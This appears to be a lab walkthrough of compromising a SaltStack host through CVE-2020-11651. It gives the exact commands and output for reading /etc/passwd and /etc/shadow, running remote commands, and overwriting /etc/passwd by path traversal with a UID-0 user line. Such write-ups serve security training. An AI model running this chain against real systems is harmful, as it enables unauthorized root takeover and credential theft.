Nmap scan on 192.158.166.62:
```
nmap -p- -Pn -A 192.168.166.62   
```   

Port 80 shows a Django website called Mezzanine, according to GitHub, Mezzanine is a content management platform built using the Django framework.

An admin login page is located at:
`http://192.168.166.62/admin/`

The search bar also looks interesting, a search query for "test" results in:
`http://192.168.166.62/search/?q=test&type=`

ZeroMQ ZMTP 2.0 Ports 4505 and 4506:
These ports are common for SaltStack

Port 8000 also open, API endpoint for Salt.
SSH Client enabled, so may be vulnerable to CVE-2020-16846 (RCE).

```bash
searchsploit salt    
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Oracle MySQL / MariaDB - Insecure Salt Generation Security Bypass     | linux/remote/38109.pl
SaltOS - 'download.php' Cross-Site Scripting                          | php/webapps/37642.txt
SaltOS Erp Crm 3.1 r8126 - Database File Download                     | php/webapps/45734.txt
SaltOS Erp Crm 3.1 r8126 - SQL Injection                              | php/webapps/45731.txt
SaltOS Erp Crm 3.1 r8126 - SQL Injection (2)                          | php/webapps/45733.txt
Saltstack 3000.1 - Remote Code Execution                              | multiple/remote/48421.txt
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


```bash
searchsploit -m 48421
```

Could not get above exploit to work. But further research of Salt vulnerabilities led me to CVE-2020-11651

https://github.com/jasperla/CVE-2020-11651-poc

Above exploit works for reading files:

```bash
python3 exploit.py --master 192.168.166.62 -r /etc/passwd                 
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/swordfish/venv/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.166.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to read /etc/passwd from 192.168.166.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin

/home/swordfish/exploit.py:351: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())
```

Confirmed using --exec flag I can execute commands on the target. Attempting to ping my IP while listening with `tcpdump` produces the result:

```bash
python3 exploit.py --master 192.168.166.62 --exec "ping 192.168.45.158 -c 1"    
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/swordfish/venv/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.166.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
/home/swordfish/exploit.py:351: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())
[+] Attemping to execute ping 192.168.45.158 -c 1 on 192.168.166.62
[+] Successfully scheduled job: 20260403140035370779
```

```bash
sudo tcpdump -i tun0 icmp  
[sudo] password for swordfish: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:00:36.262682 IP twiggy.offsec > 192.168.45.158: ICMP echo request, id 22118, seq 1, length 64
15:00:36.262694 IP 192.168.45.158 > twiggy.offsec: ICMP echo reply, id 22118, seq 1, length 64

```

Reading the `/etc/shadow` file shows root hash:

```bash
python3 exploit.py --master 192.168.166.62 -r /etc/shadow                                         
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/swordfish/venv/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.166.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to read /etc/shadow from 192.168.166.62
root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::
...SNIP...
```

Analsying the hash with `hashid` shows it's a SHA-512 Crypt:

```bash
hashid '$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/' -m
Analyzing '$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/'
[+] SHA-512 Crypt [Hashcat Mode: 1800]

```

No luck cracking the hash.

The key here is to create a new entry in the `/etc/passwd` file with relevant privileges. This can be done by copying the passwd file, adding an entry, then using the exploit to upload the new file.

```bash
swordfish:$1$r/5WEL9l$gr6/QAygoP4zISL2SSrfr1:0:0:root:/root:/bin/bash
```

```bash
python3 exploit.py --master 192.168.166.62 --upload-src passwd --upload-dest ../../../../../../../../../../../../../../../etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/home/swordfish/venv/lib/python3.13/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (192.168.166.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
[+] Attemping to upload passwd to ../../../../../../../../../../../../../../../etc/passwd on 192.168.166.62
[ ] Wrote data to file /srv/salt/../../../../../../../../../../../../../../../etc/passwd
/home/swordfish/exploit.py:351: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  jid = '{0:%Y%m%d%H%M%S%f}'.format(datetime.datetime.utcnow())
```